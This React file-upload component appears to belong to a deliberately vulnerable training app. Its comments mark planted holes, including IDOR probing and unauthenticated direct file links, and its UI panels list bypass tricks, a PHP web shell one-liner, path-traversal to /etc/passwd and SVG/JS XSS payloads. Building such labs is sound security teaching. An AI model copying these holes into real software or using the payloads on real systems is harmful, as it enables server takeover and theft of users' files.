import React, { useState, useEffect } from 'react';
import axios from 'axios';

function FileUpload({ user }) {
  const [files, setFiles] = useState([]);
  const [uploading, setUploading] = useState(false);
  const [message, setMessage] = useState('');
  const [error, setError] = useState('');
  const [selectedFile, setSelectedFile] = useState(null);

  useEffect(() => {
    loadFiles();
  }, []);

  const loadFiles = async () => {
    try {
      const response = await axios.get('/files/list');
      setFiles(response.data.files);
    } catch (error) {
      console.error('Failed to load files:', error);
      setError('Failed to load files');
    }
  };

  const handleFileSelect = (e) => {
    const file = e.target.files[0];
    setSelectedFile(file);
    
    // VULNERABILITY: Log file details including potential sensitive info
    if (file) {
      console.log('File selected:', {
        name: file.name,
        size: file.size,
        type: file.type,
        lastModified: file.lastModified
      });
    }
  };

  const handleUpload = async (e) => {
    e.preventDefault();
    
    if (!selectedFile) {
      setError('Please select a file');
      return;
    }

    setUploading(true);
    setError('');
    setMessage('');

    try {
      const formData = new FormData();
      formData.append('file', selectedFile);

      const response = await axios.post('/files/upload', formData, {
        headers: {
          'Content-Type': 'multipart/form-data'
        }
      });

      setMessage(`File uploaded successfully: ${response.data.file.originalName}`);
      setSelectedFile(null);
      document.getElementById('fileInput').value = '';
      loadFiles();
      
      // VULNERABILITY: Log upload details
      console.log('File upload successful:', response.data);

    } catch (error) {
      console.error('Upload failed:', error);
      setError(error.response?.data?.error || 'Upload failed');
    } finally {
      setUploading(false);
    }
  };

  const deleteFile = async (fileId) => {
    if (!confirm('Are you sure you want to delete this file?')) return;

    try {
      await axios.delete(`/files/${fileId}`);
      setMessage('File deleted successfully');
      loadFiles();
    } catch (error) {
      console.error('Delete failed:', error);
      setError('Failed to delete file');
    }
  };

  // VULNERABILITY: Test file access by ID (IDOR)
  const testFileAccess = (fileId) => {
    // Try to access files with different IDs
    const testIds = [fileId - 1, fileId + 1, fileId + 5, fileId + 10];
    
    testIds.forEach(id => {
      const testUrl = `/api/files/download/${id}`;
      console.log(`Testing file access: ${testUrl}`);
      
      // Open in new tab to test
      window.open(testUrl, '_blank');
    });
  };

  return (
    <div className="space-y-6">
      {/* File Upload Form */}
      <div className="bg-white rounded-lg shadow p-6">
        <h2 className="text-2xl font-bold mb-6">File Upload</h2>
        
        {message && (
          <div className="alert-success mb-4">{message}</div>
        )}
        
        {error && (
          <div className="alert-error mb-4">{error}</div>
        )}

        <form onSubmit={handleUpload} className="space-y-4">
          <div>
            <label htmlFor="fileInput" className="block text-sm font-medium text-gray-700 mb-2">
              Select File
            </label>
            <input
              type="file"
              id="fileInput"
              onChange={handleFileSelect}
              className="block w-full text-sm text-gray-500 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-sm file:font-semibold file:bg-blue-50 file:text-blue-700 hover:file:bg-blue-100"
            />
            <p className="text-xs text-gray-500 mt-1">
              Allowed types: .jpg, .jpeg, .png, .pdf, .txt (validation is weak - try other extensions!)
            </p>
          </div>

          {selectedFile && (
            <div className="p-3 bg-gray-50 rounded">
              <p className="text-sm"><strong>Selected:</strong> {selectedFile.name}</p>
              <p className="text-xs text-gray-600">Size: {(selectedFile.size / 1024).toFixed(2)} KB</p>
              <p className="text-xs text-gray-600">Type: {selectedFile.type}</p>
            </div>
          )}

          <button
            type="submit"
            disabled={uploading || !selectedFile}
            className="btn-primary"
          >
            {uploading ? 'Uploading...' : 'Upload File'}
          </button>
        </form>
      </div>

      {/* Uploaded Files List */}
      <div className="bg-white rounded-lg shadow p-6">
        <h3 className="text-xl font-semibold mb-4">Your Files</h3>
        
        {files.length > 0 ? (
          <div className="overflow-x-auto">
            <table className="min-w-full table-auto">
              <thead>
                <tr className="bg-gray-50">
                  <th className="px-4 py-2 text-left">ID</th>
                  <th className="px-4 py-2 text-left">Filename</th>
                  <th className="px-4 py-2 text-left">Original Name</th>
                  <th className="px-4 py-2 text-left">Size</th>
                  <th className="px-4 py-2 text-left">Upload Date</th>
                  <th className="px-4 py-2 text-center">Actions</th>
                </tr>
              </thead>
              <tbody>
                {files.map((file) => (
                  <tr key={file.id} className="border-t">
                    <td className="px-4 py-2 font-mono text-sm">{file.id}</td>
                    <td className="px-4 py-2 font-mono text-xs">{file.filename}</td>
                    <td className="px-4 py-2">{file.originalName}</td>
                    <td className="px-4 py-2 text-sm">
                      {file.size ? (file.size / 1024).toFixed(2) + ' KB' : 'Unknown'}
                    </td>
                    <td className="px-4 py-2 text-sm">
                      {new Date(file.created_at).toLocaleString()}
                    </td>
                    <td className="px-4 py-2">
                      <div className="flex space-x-2 justify-center">
                        <a
                          href={file.downloadUrl}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="text-blue-600 hover:text-blue-800 text-sm"
                        >
                          Download
                        </a>
                        
                        <a
                          href={file.directPath}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="text-green-600 hover:text-green-800 text-sm"
                          title="Direct access (no auth required)"
                        >
                          Direct
                        </a>
                        
                        <button
                          onClick={() => testFileAccess(file.id)}
                          className="text-purple-600 hover:text-purple-800 text-sm"
                          title="Test IDOR vulnerability"
                        >
                          Test IDOR
                        </button>
                        
                        <button
                          onClick={() => deleteFile(file.id)}
                          className="text-red-600 hover:text-red-800 text-sm"
                        >
                          Delete
                        </button>
                      </div>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        ) : (
          <div className="text-center py-8 text-gray-500">
            <p>No files uploaded yet.</p>
          </div>
        )}
      </div>

      {/* File Upload Vulnerability Testing */}
      <div className="bg-red-50 border border-red-200 rounded-lg p-4">
        <h4 className="font-medium text-red-800 mb-2">🚨 File Upload Vulnerability Testing</h4>
        <div className="text-sm text-red-700 space-y-2">
          <p><strong>Extension Bypass:</strong> Try uploading shell.php.jpg or script.js.png</p>
          <p><strong>MIME Bypass:</strong> Upload executable files with image extensions</p>
          <p><strong>Direct Access:</strong> Files are accessible without authentication via /uploads/filename</p>
          <p><strong>IDOR Testing:</strong> Use "Test IDOR" button to access other users' files</p>
          <p><strong>Path Traversal:</strong> Try filenames like "../../../etc/passwd.jpg"</p>
        </div>
      </div>

      {/* File Upload Examples */}
      <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
        <h4 className="font-medium text-yellow-800 mb-2">Example Malicious Files to Test</h4>
        <div className="text-sm text-yellow-700 space-y-1">
          <p><strong>Web Shell:</strong> &lt;?php system($_GET['cmd']); ?&gt; (save as shell.php.jpg)</p>
          <p><strong>JavaScript:</strong> alert('XSS from uploaded file') (save as test.js.png)</p>
          <p><strong>SVG XSS:</strong> &lt;svg onload=alert('XSS')&gt;&lt;/svg&gt; (save as image.svg.jpg)</p>
        </div>
      </div>
    </div>
  );
}

export default FileUpload; 